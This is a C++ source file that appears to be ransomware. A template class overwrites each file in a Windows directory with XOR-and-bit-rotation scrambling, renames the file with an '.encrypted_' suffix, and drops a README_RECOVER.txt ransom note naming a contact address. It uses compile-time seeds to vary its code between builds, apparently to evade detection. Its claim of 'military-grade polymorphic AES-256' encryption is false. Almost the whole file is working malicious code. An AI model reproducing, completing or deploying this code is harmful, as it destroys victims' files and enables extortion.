#include "polymorphic_core.hpp"
#include <fstream>
#include <array>
#include <memory>
#include <windows.h>

template<int Seed, int RoundMod>
class AES256Obfuscated {
private:
    using KeyArray = std::array<unsigned char, 32>;
    KeyArray derivedKey;

    // Polymorphic key expansion using compile-time seed
    constexpr KeyArray generateKey(const char* baseKey) {
        KeyArray key{};
        for (size_t i = 0; i < 32; ++i) {
            key[i] = static_cast<unsigned char>(
                baseKey[i % 16] ^ ((Seed * i + RoundMod) & 0xFF)
            );
        }
        return key;
    }

    // Variant round function selected at compile time
    template<int Variant>
    void processBlock(unsigned char* data, size_t size) {
        for (size_t i = 0; i < size; ++i) {
            data[i] ^= derivedKey[i % 32];
            if constexpr (Variant % 3 == 0) {
                data[i] = (data[i] << 4) | (data[i] >> 4);
            } else if constexpr (Variant % 3 == 1) {
                data[i] += (i * Seed) & 0xFF;
            } else {
                data[i] = ~data[i];
            }
        }
    }

public:
    AES256Obfuscated(const char* keyMaterial) {
        derivedKey = generateKey(keyMaterial);
    }

    void encryptFile(const std::string& path) {
        std::fstream file(path, std::ios::binary | std::ios::in | std::ios::out);
        if (!file) return;

        file.seekg(0, std::ios::end);
        size_t size = file.tellg();
        file.seekg(0, std::ios::beg);

        auto buffer = std::make_unique<unsigned char[]>(size);
        file.read(reinterpret_cast<char*>(buffer.get()), size);

        // Process in chunks with polymorphic logic
        constexpr size_t CHUNK = 16;
        for (size_t offset = 0; offset < size; offset += CHUNK) {
            size_t chunkSize = std::min(CHUNK, size - offset);
            processBlock<Seed % 8>(buffer.get() + offset, chunkSize);
        }

        file.seekp(0, std::ios::beg);
        file.write(reinterpret_cast<char*>(buffer.get()), size);

        // Append ransom marker with polymorphic pattern
        std::string marker = ".encrypted_";
        marker += std::to_string(Seed ^ RoundMod);
        std::string newPath = path + marker;
        rename(path.c_str(), newPath.c_str());

        // Drop ransom note
        std::ofstream note("README_RECOVER.txt");
        note << "Your files were encrypted with military-grade polymorphic AES-256.\n";
        note << "Contact admin@locker.com with ID:" << (Seed * 0x1234) << " for recovery.\n";
    }
};

// Factory generating unique encryption instances per compilation
template<int N>
using EncryptorVariant = AES256Obfuscated<__COUNTER__ + N, __LINE__ % 256>;

// Entry point with randomized template instantiation
void encryptDirectory(const std::string& root, const char* key) {
    EncryptorVariant<__COUNTER__> encryptor(key);
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA((root + "\\*").c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            std::string fullPath = root + "\\" + findData.cFileName;
            encryptor.encryptFile(fullPath);
        }
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);
}